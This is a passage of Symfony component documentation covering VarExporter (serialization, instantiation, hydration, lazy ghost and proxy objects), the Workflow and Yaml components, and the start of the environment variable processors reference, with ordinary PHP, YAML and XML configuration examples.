    calling their constructors.

Installation
------------

.. code-block:: terminal

    $ composer require --dev symfony/var-exporter

.. include:: /components/require_autoload.rst.inc

Exporting/Serializing Variables
-------------------------------

The main feature of this component is to serialize PHP data structures to plain
PHP code, similar to PHP's :phpfunction:`var_export` function::

    use Symfony\Component\VarExporter\VarExporter;

    $exported = VarExporter::export($someVariable);
    // store the $exported data in some file or cache system for later reuse
    $data = file_put_contents('exported.php', '<?php return '.$exported.';');

    // later, regenerate the original variable when you need it
    $regeneratedVariable = require 'exported.php';

The reason to use this component instead of ``serialize()`` or ``igbinary`` is
performance: thanks to `OPcache`_, the resulting code is significantly faster
and more memory efficient than using ``unserialize()`` or ``igbinary_unserialize()``.

In addition, there are some minor differences:

* If the original variable defines them, all the semantics associated with
  ``serialize()`` (such as ``__wakeup()``, ``__sleep()``, and ``Serializable``)
  are preserved (``var_export()`` ignores them);
* References involving ``SplObjectStorage``, ``ArrayObject`` or ``ArrayIterator``
  instances are preserved;
* Missing classes throw a ``ClassNotFoundException`` instead of being
  unserialized to ``PHP_Incomplete_Class`` objects;
* ``Reflection*``, ``IteratorIterator`` and ``RecursiveIteratorIterator``
  classes throw an exception when being serialized.

The exported data is a `PSR-2`_ compatible PHP file. Consider for example the
following class hierarchy::

    abstract class AbstractClass
    {
        protected int $foo;
        private int $bar;

        protected function setBar($bar): void
        {
            $this->bar = $bar;
        }
    }

    class ConcreteClass extends AbstractClass
    {
        public function __construct()
        {
            $this->foo = 123;
            $this->setBar(234);
        }
    }

When exporting the ``ConcreteClass`` data with VarExporter, the generated PHP
file looks like this::

    return \Symfony\Component\VarExporter\Internal\Hydrator::hydrate(
        $o = [
            clone (\Symfony\Component\VarExporter\Internal\Registry::$prototypes['Symfony\\Component\\VarExporter\\Tests\\ConcreteClass'] ?? \Symfony\Component\VarExporter\Internal\Registry::p('Symfony\\Component\\VarExporter\\Tests\\ConcreteClass')),
        ],
        null,
        [
            'Symfony\\Component\\VarExporter\\Tests\\AbstractClass' => [
                'foo' => [
                    123,
                ],
                'bar' => [
                    234,
                ],
            ],
        ],
        $o[0],
        []
    );

.. _instantiating-php-classes:

Instantiating & Hydrating PHP Classes
-------------------------------------

Instantiator
~~~~~~~~~~~~

This component provides an instantiator, which can create objects and set
their properties without calling their constructors or any other methods::

    use Symfony\Component\VarExporter\Instantiator;

    // creates an empty instance of Foo
    $fooObject = Instantiator::instantiate(Foo::class);

    // creates a Foo instance and sets one of its properties
    $fooObject = Instantiator::instantiate(Foo::class, ['propertyName' => $propertyValue]);

The instantiator can also populate the property of a parent class. Assuming ``Bar``
is the parent class of ``Foo`` and defines a ``privateBarProperty`` attribute::

    use Symfony\Component\VarExporter\Instantiator;

    // creates a Foo instance and sets a private property defined on its parent Bar class
    $fooObject = Instantiator::instantiate(Foo::class, [], [
        Bar::class => ['privateBarProperty' => $propertyValue],
    ]);

Instances of ``ArrayObject``, ``ArrayIterator`` and ``SplObjectHash`` can be
created by using the special ``"\0"`` property name to define their internal value::

    use Symfony\Component\VarExporter\Instantiator;

    // creates an SplObjectStorage where $info1 is associated with $object1, etc.
    $theObject = Instantiator::instantiate(SplObjectStorage::class, [
        "\0" => [$object1, $info1, $object2, $info2...],
    ]);

    // creates an ArrayObject populated with $inputArray
    $theObject = Instantiator::instantiate(ArrayObject::class, [
        "\0" => [$inputArray],
    ]);

Hydrator
~~~~~~~~

Instead of populating objects that don't exist yet (using the instantiator),
sometimes you want to populate properties of an already existing object. This is
the goal of the :class:`Symfony\\Component\\VarExporter\\Hydrator`. Here is a
basic usage of the hydrator populating a property of an object::

    use Symfony\Component\VarExporter\Hydrator;

    $object = new Foo();
    Hydrator::hydrate($object, ['propertyName' => $propertyValue]);

The hydrator can also populate the property of a parent class. Assuming ``Bar``
is the parent class of ``Foo`` and defines a ``privateBarProperty`` attribute::

    use Symfony\Component\VarExporter\Hydrator;

    $object = new Foo();
    Hydrator::hydrate($object, [], [
        Bar::class => ['privateBarProperty' => $propertyValue],
    ]);

    // alternatively, you can use the special "\0" syntax
    Hydrator::hydrate($object, ["\0Bar\0privateBarProperty" => $propertyValue]);

Instances of ``ArrayObject``, ``ArrayIterator`` and ``SplObjectHash`` can be
populated by using the special ``"\0"`` property name to define their internal value::

    use Symfony\Component\VarExporter\Hydrator;

    // creates an SplObjectHash where $info1 is associated with $object1, etc.
    $storage = new SplObjectStorage();
    Hydrator::hydrate($storage, [
        "\0" => [$object1, $info1, $object2, $info2...],
    ]);

    // creates an ArrayObject populated with $inputArray
    $arrayObject = new ArrayObject();
    Hydrator::hydrate($arrayObject, [
        "\0" => [$inputArray],
    ]);

Creating Lazy Objects
---------------------

Lazy-objects are objects instantiated empty and populated on-demand. This is
particularly useful when you have for example properties in your classes that
requires some heavy computation to determine their value. In this case, you
may want to trigger the property's value processing only when you actually need
its value. Thanks to this, the heavy computation won't be done if you never use
this property. The VarExporter component is bundled with two traits helping
you implement such mechanism easily in your classes.

.. _var-exporter_ghost-objects:

LazyGhostTrait
~~~~~~~~~~~~~~

Ghost objects are empty objects, which see their properties populated the first
time any method is called. Thanks to :class:`Symfony\\Component\\VarExporter\\LazyGhostTrait`,
the implementation of the lazy mechanism is eased. The ``MyLazyObject::populateHash()``
method will be called only when the object is actually used and needs to be
initialized::

    namespace App\Hash;

    use Symfony\Component\VarExporter\LazyGhostTrait;

    class HashProcessor
    {
        use LazyGhostTrait;

        // This property may require a heavy computation to have its value
        public readonly string $hash;

        public function __construct()
        {
            self::createLazyGhost(initializer: $this->populateHash(...), instance: $this);
        }

        private function populateHash(array $data): void
        {
            // Compute $this->hash value with the passed data
        }
    }

:class:`Symfony\\Component\\VarExporter\\LazyGhostTrait` also allows to
convert non-lazy classes to lazy ones::

    namespace App\Hash;

    use Symfony\Component\VarExporter\LazyGhostTrait;

    class HashProcessor
    {
        public readonly string $hash;

        public function __construct(array $data)
        {
            $this->populateHash($data);
        }

        private function populateHash(array $data): void
        {
            // ...
        }

        public function validateHash(): bool
        {
            // ...
        }
    }

    class LazyHashProcessor extends HashProcessor
    {
        use LazyGhostTrait;
    }

    $processor = LazyHashProcessor::createLazyGhost(initializer: function (HashProcessor $instance): void {
        // Do any operation you need here: call setters, getters, methods to validate the hash, etc.
        $data = /** Retrieve required data to compute the hash */;
        $instance->__construct(...$data);
        $instance->validateHash();
    });

While you never query ``$processor->hash`` value, heavy methods will never be
triggered. But still, the ``$processor`` object exists and can be used in your
code, passed to methods, functions, etc.

Additionally and by adding two arguments to the initializer function, it is
possible to initialize properties one-by-one::

    $processor = LazyHashProcessor::createLazyGhost(initializer: function (HashProcessor $instance, string $propertyName, ?string $propertyScope): mixed {
        if (HashProcessor::class === $propertyScope && 'hash' === $propertyName) {
            // Return $hash value
        }

        // Then you can add more logic for the other properties
    });

Ghost objects unfortunately can't work with abstract classes or internal PHP
classes. Nevertheless, the VarExporter component covers this need with the help
of :ref:`Virtual Proxies <var-exporter_virtual-proxies>`.

.. _var-exporter_virtual-proxies:

LazyProxyTrait
~~~~~~~~~~~~~~

The purpose of virtual proxies in the same one as
:ref:`ghost objects <var-exporter_ghost-objects>`, but their internal behavior is
totally different. Where ghost objects requires to extend a base class, virtual
proxies take advantage of the **Liskov Substitution principle**. This principle
describes that if two objects are implementing the same interface, you can swap
between the different implementations without breaking your application. This is
what virtual proxies take advantage of. To use virtual proxies, you may use
:class:`Symfony\\Component\\VarExporter\\ProxyHelper` to generate proxy's class
code::

    namespace App\Hash;

    use Symfony\Component\VarExporter\ProxyHelper;

    interface ProcessorInterface
    {
        public function getHash(): bool;
    }

    abstract class AbstractProcessor implements ProcessorInterface
    {
        protected string $hash;

        public function getHash(): bool
        {
            return $this->hash;
        }
    }

    class HashProcessor extends AbstractProcessor
    {
        public function __construct(array $data)
        {
            $this->populateHash($data);
        }

        private function populateHash(array $data): void
        {
            // ...
        }
    }

    $proxyCode = ProxyHelper::generateLazyProxy(new \ReflectionClass(AbstractProcessor::class));
    // $proxyCode contains the actual proxy and the reference to LazyProxyTrait.
    // In production env, this should be dumped into a file to avoid calling eval().
    eval('class HashProcessorProxy'.$proxyCode);

    $processor = HashProcessorProxy::createLazyProxy(initializer: function (): ProcessorInterface {
        $data = /** Retrieve required data to compute the hash */;
        $instance = new HashProcessor(...$data);

        // Do any operation you need here: call setters, getters, methods to validate the hash, etc.

        return $instance;
    });

Just like ghost objects, while you never query ``$processor->hash``, its value
will not be computed. The main difference with ghost objects is that this time,
a proxy of an abstract class was created. This also works with internal PHP class.

.. _`OPcache`: https://www.php.net/opcache
.. _`PSR-2`: https://www.php-fig.org/psr/psr-2/
The Workflow Component
======================

    The Workflow component provides tools for managing a workflow or finite
    state machine.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/workflow

.. include:: /components/require_autoload.rst.inc

Creating a Workflow
-------------------

The workflow component gives you an object oriented way to define a process
or a life cycle that your object goes through. Each step or stage in the
process is called a *place*. You do also define *transitions* that describe
the action to get from one place to another.

.. image:: /_images/components/workflow/states_transitions.png
    :alt: An example state diagram for a workflow, showing transitions and places.

A set of places and transitions creates a **definition**. A workflow needs
a ``Definition`` and a way to write the states to the objects (i.e. an
instance of a :class:`Symfony\\Component\\Workflow\\MarkingStore\\MarkingStoreInterface`).

Consider the following example for a blog post. A post can have one of a number
of predefined statuses (``draft``, ``reviewed``, ``rejected``, ``published``). In a workflow,
these statuses are called **places**. You can define the workflow like this::

    use Symfony\Component\Workflow\DefinitionBuilder;
    use Symfony\Component\Workflow\MarkingStore\MethodMarkingStore;
    use Symfony\Component\Workflow\Transition;
    use Symfony\Component\Workflow\Workflow;

    $definitionBuilder = new DefinitionBuilder();
    $definition = $definitionBuilder->addPlaces(['draft', 'reviewed', 'rejected', 'published'])
        // Transitions are defined with a unique name, an origin place and a destination place
        ->addTransition(new Transition('to_review', 'draft', 'reviewed'))
        ->addTransition(new Transition('publish', 'reviewed', 'published'))
        ->addTransition(new Transition('reject', 'reviewed', 'rejected'))
        ->build()
    ;

    $singleState = true; // true if the subject can be in only one state at a given time
    $property = 'currentState'; // subject property name where the state is stored
    $marking = new MethodMarkingStore($singleState, $property);
    $workflow = new Workflow($definition, $marking);

The ``Workflow`` can now help you to decide what *transitions* (actions) are allowed
on a blog post depending on what *place* (state) it is in. This will keep your domain
logic in one place and not spread all over your application.

Usage
-----

Here's an example of using the workflow defined above::

    // ...
    // Consider that $blogPost is in place "draft" by default
    $blogPost = new BlogPost();

    $workflow->can($blogPost, 'publish'); // False
    $workflow->can($blogPost, 'to_review'); // True

    $workflow->apply($blogPost, 'to_review'); // $blogPost is now in place "reviewed"

    $workflow->can($blogPost, 'publish'); // True
    $workflow->getEnabledTransitions($blogPost); // $blogPost can perform transition "publish" or "reject"

Initialization
--------------

If the property of your object is ``null`` and you want to set it with the
``initial_marking`` from the configuration, you can call the ``getMarking()``
method to initialize the object property::

    // ...
    $blogPost = new BlogPost();

    // initiate workflow
    $workflow->getMarking($blogPost);

Using The Workflow Registry
---------------------------

When you define multiple workflows you may consider using a ``Registry``,
which is an object that stores and provides access to different workflows.
A registry will also help you to decide if a workflow supports the object you
are trying to use it with::

    use Acme\Entity\BlogPost;
    use Acme\Entity\Newsletter;
    use Symfony\Component\Workflow\Registry;
    use Symfony\Component\Workflow\SupportStrategy\InstanceOfSupportStrategy;

    $blogPostWorkflow = ...;
    $newsletterWorkflow = ...;

    $registry = new Registry();
    $registry->addWorkflow($blogPostWorkflow, new InstanceOfSupportStrategy(BlogPost::class));
    $registry->addWorkflow($newsletterWorkflow, new InstanceOfSupportStrategy(Newsletter::class));

You can then use the registry to get the workflow for a specific object::

    $blogPost = new BlogPost();
    $workflow = $registry->get($blogPost);

    // initiate workflow
    $workflow->getMarking($blogPost);

.. caution::

    Beware that injecting the ``Registry`` into your services is **not**
    recommended. Indeed, it prevents some optimization like lazy-loading
    from working and could be a performance hog. Instead, you should always
    inject the workflow you need.

Learn more
----------

Read more about the usage of the :doc:`Workflow component </workflow>` inside a Symfony application.

.. toctree::
    :maxdepth: 1
    :glob:

    /workflow/*
The Yaml Component
==================

    The Yaml component loads and dumps YAML files.

What is It?
-----------

The Symfony Yaml component parses YAML strings to convert them to PHP arrays.
It is also able to convert PHP arrays to YAML strings.

`YAML`_, *YAML Ain't Markup Language*, is a human friendly data serialization
standard for all programming languages. YAML is a great format for your
configuration files. YAML files are as expressive as XML files and as readable
as INI files.

.. tip::

    Learn more about :doc:`YAML specifications </reference/formats/yaml>`.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/yaml

.. include:: /components/require_autoload.rst.inc

Why?
----

Fast
~~~~

One of the goals of Symfony Yaml is to find the right balance between speed and
features. It supports just the needed features to handle configuration files.
Notable lacking features are: document directives, multi-line quoted messages,
compact block collections and multi-document files.

Real Parser
~~~~~~~~~~~

It supports a real parser and is able to parse a large subset of the YAML
specification, for all your configuration needs. It also means that the parser
is pretty robust, easy to understand, and simple enough to extend.

Clear Error Messages
~~~~~~~~~~~~~~~~~~~~

Whenever you have a syntax problem with your YAML files, the library outputs a
helpful message with the filename and the line number where the problem
occurred. It eases the debugging a lot.

Dump Support
~~~~~~~~~~~~

It is also able to dump PHP arrays to YAML with object support, and inline
level configuration for pretty outputs.

Types Support
~~~~~~~~~~~~~

It supports most of the YAML built-in types like dates, integers, octal numbers,
booleans, and much more...

Full Merge Key Support
~~~~~~~~~~~~~~~~~~~~~~

Full support for references, aliases, and full merge key. Don't repeat
yourself by referencing common configuration bits.

.. _using-the-symfony2-yaml-component:

Using the Symfony YAML Component
--------------------------------

The Symfony Yaml component consists of two main classes:
one parses YAML strings (:class:`Symfony\\Component\\Yaml\\Parser`), and the
other dumps a PHP array to a YAML string
(:class:`Symfony\\Component\\Yaml\\Dumper`).

On top of these two classes, the :class:`Symfony\\Component\\Yaml\\Yaml` class
acts as a thin wrapper that simplifies common uses.

Reading YAML Contents
~~~~~~~~~~~~~~~~~~~~~

The :method:`Symfony\\Component\\Yaml\\Yaml::parse` method parses a YAML
string and converts it to a PHP array::

    use Symfony\Component\Yaml\Yaml;

    $value = Yaml::parse("foo: bar");
    // $value = ['foo' => 'bar']

If an error occurs during parsing, the parser throws a
:class:`Symfony\\Component\\Yaml\\Exception\\ParseException` exception
indicating the error type and the line in the original YAML string where the
error occurred::

    use Symfony\Component\Yaml\Exception\ParseException;

    try {
        $value = Yaml::parse('...');
    } catch (ParseException $exception) {
        printf('Unable to parse the YAML string: %s', $exception->getMessage());
    }

Reading YAML Files
~~~~~~~~~~~~~~~~~~

The :method:`Symfony\\Component\\Yaml\\Yaml::parseFile` method parses the YAML
contents of the given file path and converts them to a PHP value::

    use Symfony\Component\Yaml\Yaml;

    $value = Yaml::parseFile('/path/to/file.yaml');

If an error occurs during parsing, the parser throws a ``ParseException`` exception.

.. _components-yaml-dump:

Writing YAML Files
~~~~~~~~~~~~~~~~~~

The :method:`Symfony\\Component\\Yaml\\Yaml::dump` method dumps any PHP
array to its YAML representation::

    use Symfony\Component\Yaml\Yaml;

    $array = [
        'foo' => 'bar',
        'bar' => ['foo' => 'bar', 'bar' => 'baz'],
    ];

    $yaml = Yaml::dump($array);

    file_put_contents('/path/to/file.yaml', $yaml);

If an error occurs during the dump, the parser throws a
:class:`Symfony\\Component\\Yaml\\Exception\\DumpException` exception.

.. _array-expansion-and-inlining:

Expanded and Inlined Arrays
...........................

The YAML format supports two kind of representation for arrays, the expanded
one, and the inline one. By default, the dumper uses the expanded
representation:

.. code-block:: yaml

    foo: bar
    bar:
        foo: bar
        bar: baz

The second argument of the :method:`Symfony\\Component\\Yaml\\Yaml::dump`
method customizes the level at which the output switches from the expanded
representation to the inline one::

    echo Yaml::dump($array, 1);

.. code-block:: yaml

    foo: bar
    bar: { foo: bar, bar: baz }

.. code-block:: php

    echo Yaml::dump($array, 2);

.. code-block:: yaml

    foo: bar
    bar:
        foo: bar
        bar: baz

Indentation
...........

By default, the YAML component will use 4 spaces for indentation. This can be
changed using the third argument as follows::

    // uses 8 spaces for indentation
    echo Yaml::dump($array, 2, 8);

.. code-block:: yaml

    foo: bar
    bar:
            foo: bar
            bar: baz

Numeric Literals
................

Long numeric literals, being integer, float or hexadecimal, are known for their
poor readability in code and configuration files. That's why YAML files allow to
add underscores to improve their readability:

.. code-block:: yaml

    parameters:
        credit_card_number: 1234_5678_9012_3456
        long_number: 10_000_000_000
        pi: 3.14159_26535_89793
        hex_words: 0x_CAFE_F00D

During the parsing of the YAML contents, all the ``_`` characters are removed
from the numeric literal contents, so there is not a limit in the number of
underscores you can include or the way you group contents.

Advanced Usage: Flags
---------------------

.. _objects-for-mappings:

Object Parsing and Dumping
~~~~~~~~~~~~~~~~~~~~~~~~~~

You can dump objects by using the ``DUMP_OBJECT`` flag::

    $object = new \stdClass();
    $object->foo = 'bar';

    $dumped = Yaml::dump($object, 2, 4, Yaml::DUMP_OBJECT);
    // !php/object 'O:8:"stdClass":1:{s:5:"foo";s:7:"bar";}'

And parse them by using the ``PARSE_OBJECT`` flag::

    $parsed = Yaml::parse($dumped, Yaml::PARSE_OBJECT);
    var_dump(is_object($parsed)); // true
    echo $parsed->foo; // bar

The YAML component uses PHP's ``serialize()`` method to generate a string
representation of the object.

.. danger::

    Object serialization is specific to this implementation, other PHP YAML
    parsers will likely not recognize the ``php/object`` tag and non-PHP
    implementations certainly won't - use with discretion!

Parsing and Dumping Objects as Maps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can dump objects as Yaml maps by using the ``DUMP_OBJECT_AS_MAP`` flag::

    $object = new \stdClass();
    $object->foo = 'bar';

    $dumped = Yaml::dump(['data' => $object], 2, 4, Yaml::DUMP_OBJECT_AS_MAP);
    // $dumped = "data:\n    foo: bar"

And parse them by using the ``PARSE_OBJECT_FOR_MAP`` flag::

    $parsed = Yaml::parse($dumped, Yaml::PARSE_OBJECT_FOR_MAP);
    var_dump(is_object($parsed)); // true
    var_dump(is_object($parsed->data)); // true
    echo $parsed->data->foo; // bar

The YAML component uses PHP's ``(array)`` casting to generate a string
representation of the object as a map.

.. _invalid-types-and-object-serialization:

Handling Invalid Types
~~~~~~~~~~~~~~~~~~~~~~

By default, the parser will encode invalid types as ``null``. You can make the
parser throw exceptions by using the ``PARSE_EXCEPTION_ON_INVALID_TYPE``
flag::

    $yaml = '!php/object \'O:8:"stdClass":1:{s:5:"foo";s:7:"bar";}\'';
    Yaml::parse($yaml, Yaml::PARSE_EXCEPTION_ON_INVALID_TYPE); // throws an exception

Similarly you can use ``DUMP_EXCEPTION_ON_INVALID_TYPE`` when dumping::

    $data = new \stdClass(); // by default objects are invalid.
    Yaml::dump($data, 2, 4, Yaml::DUMP_EXCEPTION_ON_INVALID_TYPE); // throws an exception

Date Handling
~~~~~~~~~~~~~

By default, the YAML parser will convert unquoted strings which look like a
date or a date-time into a Unix timestamp; for example ``2016-05-27`` or
``2016-05-27T02:59:43.1Z`` (`ISO-8601`_)::

    Yaml::parse('2016-05-27'); // 1464307200

You can make it convert to a ``DateTime`` instance by using the ``PARSE_DATETIME``
flag::

    $date = Yaml::parse('2016-05-27', Yaml::PARSE_DATETIME);
    var_dump(get_class($date)); // DateTime

Dumping Multi-line Literal Blocks
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In YAML, multiple lines can be represented as literal blocks. By default, the
dumper will encode multiple lines as an inline string::

    $string = ["string" => "Multiple\nLine\nString"];
    $yaml = Yaml::dump($string);
    echo $yaml; // string: "Multiple\nLine\nString"

You can make it use a literal block with the ``DUMP_MULTI_LINE_LITERAL_BLOCK``
flag::

    $string = ["string" => "Multiple\nLine\nString"];
    $yaml = Yaml::dump($string, 2, 4, Yaml::DUMP_MULTI_LINE_LITERAL_BLOCK);
    echo $yaml;
    //  string: |
    //       Multiple
    //       Line
    //       String

Parsing PHP Constants
~~~~~~~~~~~~~~~~~~~~~

By default, the YAML parser treats the PHP constants included in the contents as
regular strings. Use the ``PARSE_CONSTANT`` flag and the special ``!php/const``
syntax to parse them as proper PHP constants::

    $yaml = '{ foo: PHP_INT_SIZE, bar: !php/const PHP_INT_SIZE }';
    $parameters = Yaml::parse($yaml, Yaml::PARSE_CONSTANT);
    // $parameters = ['foo' => 'PHP_INT_SIZE', 'bar' => 8];

Parsing PHP Enumerations
~~~~~~~~~~~~~~~~~~~~~~~~

The YAML parser supports `PHP enumerations`_, both unit and backed enums.
By default, they are parsed as regular strings. Use the ``PARSE_CONSTANT`` flag
and the special ``!php/enum`` syntax to parse them as proper PHP enums::

    enum FooEnum: string
    {
        case Foo = 'foo';
        case Bar = 'bar';
    }

    // ...

    $yaml = '{ foo: FooEnum::Foo, bar: !php/enum FooEnum::Foo }';
    $parameters = Yaml::parse($yaml, Yaml::PARSE_CONSTANT);
    // the value of the 'foo' key is a string because it missed the `!php/enum` syntax
    // $parameters = ['foo' => 'FooEnum::Foo', 'bar' => FooEnum::Foo];

    $yaml = '{ foo: FooEnum::Foo, bar: !php/enum FooEnum::Foo->value }';
    $parameters = Yaml::parse($yaml, Yaml::PARSE_CONSTANT);
    // the value of the 'foo' key is a string because it missed the `!php/enum` syntax
    // $parameters = ['foo' => 'FooEnum::Foo', 'bar' => 'foo'];

You can also use ``!php/enum`` to get all the enumeration cases by only
giving the enumeration FQCN::

    enum FooEnum: string
    {
        case Foo = 'foo';
        case Bar = 'bar';
    }

    // ...

    $yaml = '{ bar: !php/enum FooEnum }';
    $parameters = Yaml::parse($yaml, Yaml::PARSE_CONSTANT);
    // $parameters = ['bar' => ['foo', 'bar']];

.. versionadded:: 7.1

    The support for using the enum FQCN without specifying a case
    was introduced in Symfony 7.1.

Parsing and Dumping of Binary Data
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Non UTF-8 encoded strings are dumped as base64 encoded data::

    $imageContents = file_get_contents(__DIR__.'/images/logo.png');

    $dumped = Yaml::dump(['logo' => $imageContents]);
    // logo: !!binary iVBORw0KGgoAAAANSUhEUgAAA6oAAADqCAY...

Binary data is automatically parsed if they include the ``!!binary`` YAML tag::

    $dumped = 'logo: !!binary iVBORw0KGgoAAAANSUhEUgAAA6oAAADqCAY...';
    $parsed = Yaml::parse($dumped);
    $imageContents = $parsed['logo'];

Parsing and Dumping Custom Tags
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to the built-in support of tags like ``!php/const`` and
``!!binary``, you can define your own custom YAML tags and parse them with the
``PARSE_CUSTOM_TAGS`` flag::

    $data = "!my_tag { foo: bar }";
    $parsed = Yaml::parse($data, Yaml::PARSE_CUSTOM_TAGS);
    // $parsed = Symfony\Component\Yaml\Tag\TaggedValue('my_tag', ['foo' => 'bar']);
    $tagName = $parsed->getTag();    // $tagName = 'my_tag'
    $tagValue = $parsed->getValue(); // $tagValue = ['foo' => 'bar']

If the contents to dump contain :class:`Symfony\\Component\\Yaml\\Tag\\TaggedValue`
objects, they are automatically transformed into YAML tags::

    use Symfony\Component\Yaml\Tag\TaggedValue;

    $data = new TaggedValue('my_tag', ['foo' => 'bar']);
    $dumped = Yaml::dump($data);
    // $dumped = '!my_tag { foo: bar }'

Dumping Null Values
~~~~~~~~~~~~~~~~~~~

The official YAML specification uses both ``null`` and ``~`` to represent null
values. This component uses ``null`` by default when dumping null values but
you can dump them as ``~`` with the ``DUMP_NULL_AS_TILDE`` flag::

    $dumped = Yaml::dump(['foo' => null]);
    // foo: null

    $dumped = Yaml::dump(['foo' => null], 2, 4, Yaml::DUMP_NULL_AS_TILDE);
    // foo: ~

Dumping Numeric Keys as Strings
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, digit-only array keys are dumped as integers. You can use the
``DUMP_NUMERIC_KEY_AS_STRING`` flag if you want to dump string-only keys::

    $dumped = Yaml::dump([200 => 'foo']);
    // 200: foo

    $dumped = Yaml::dump([200 => 'foo'], 2, 4, Yaml::DUMP_NUMERIC_KEY_AS_STRING);
    // '200': foo

Syntax Validation
~~~~~~~~~~~~~~~~~

The syntax of YAML contents can be validated through the CLI using the
:class:`Symfony\\Component\\Yaml\\Command\\LintCommand` command.

First, install the Console component:

.. code-block:: terminal

    $ composer require symfony/console

Create a console application with ``lint:yaml`` as its only command::

    // lint.php
    use Symfony\Component\Console\Application;
    use Symfony\Component\Yaml\Command\LintCommand;

    (new Application('yaml/lint'))
        ->add(new LintCommand())
        ->getApplication()
        ->setDefaultCommand('lint:yaml', true)
        ->run();

Then, execute the script for validating contents:

.. code-block:: terminal

    # validates a single file
    $ php lint.php path/to/file.yaml

    # or validates multiple files
    $ php lint.php path/to/file1.yaml path/to/file2.yaml

    # or all the files in a directory
    $ php lint.php path/to/directory

    # or all the files in multiple directories
    $ php lint.php path/to/directory1 path/to/directory2

    # or contents passed to STDIN
    $ cat path/to/file.yaml | php lint.php

    # you can also exclude one or more files from linting
    $ php lint.php path/to/directory --exclude=path/to/directory/foo.yaml --exclude=path/to/directory/bar.yaml

The result is written to STDOUT and uses a plain text format by default.
Add the ``--format`` option to get the output in JSON format:

.. code-block:: terminal

    $ php lint.php path/to/file.yaml --format json

.. tip::

    The linting command will also report any deprecations in the checked
    YAML files. This may for example be useful for recognizing deprecations of
    contents of YAML files during automated tests.

.. _`YAML`: https://yaml.org/
.. _`ISO-8601`: https://www.iso.org/iso-8601-date-and-time-format.html
.. _`PHP enumerations`: https://www.php.net/manual/en/language.types.enumerations.php
.. _env-var-processors:

Environment Variable Processors
===============================

:ref:`Using env vars to configure Symfony applications <config-env-vars>` is a
common practice to make your applications truly dynamic.

The main issue of env vars is that their values can only be strings and your
application may need other data types (integer, boolean, etc.). Symfony solves
this problem with "env var processors", which transform the original contents of
the given environment variables. The following example uses the integer
processor to turn the value of the ``HTTP_PORT`` env var into an integer:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            router:
                http_port: '%env(int:HTTP_PORT)%'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:router http-port="%env(int:HTTP_PORT)%"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->router()
                ->httpPort('%env(int:HTTP_PORT)%')
                // or
                ->httpPort(env('HTTP_PORT')->int())
            ;
        };

Built-In Environment Variable Processors
----------------------------------------

Symfony provides the following env var processors:

``env(string:FOO)``
    Casts ``FOO`` to a string:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(SECRET): 'some_secret'
            framework:
                secret: '%env(string:SECRET)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(SECRET)">some_secret</parameter>
                </parameters>

                <framework:config secret="%env(string:SECRET)%"/>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use Symfony\Component\DependencyInjection\ContainerBuilder;
            use Symfony\Config\FrameworkConfig;

            return static function (ContainerBuilder $container, FrameworkConfig $framework): void {
                $container->setParameter('env(SECRET)', 'some_secret');
                $framework->secret(env('SECRET')->string());
            };

``env(bool:FOO)``
    Casts ``FOO`` to a bool (``true`` values are ``'true'``, ``'on'``, ``'yes'``,
    all numbers except ``0`` and ``0.0`` and all numeric strings except ``'0'``
    and ``'0.0'``; everything else is ``false``):

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(HTTP_METHOD_OVERRIDE): 'true'
            framework:
                http_method_override: '%env(bool:HTTP_METHOD_OVERRIDE)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(HTTP_METHOD_OVERRIDE)">true</parameter>
                </parameters>

                <framework:config http-method-override="%env(bool:HTTP_METHOD_OVERRIDE)%"/>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use Symfony\Component\DependencyInjection\ContainerBuilder;
            use Symfony\Config\FrameworkConfig;

            return static function (ContainerBuilder $container, FrameworkConfig $framework): void {
                $container->setParameter('env(HTTP_METHOD_OVERRIDE)', 'true');
                $framework->httpMethodOverride(env('HTTP_METHOD_OVERRIDE')->bool());
            };

``env(not:FOO)``
    Casts ``FOO`` to a bool (just as ``env(bool:...)`` does) except it returns the inverted value
    (falsy values are returned as ``true``, truthy values are returned as ``false``):

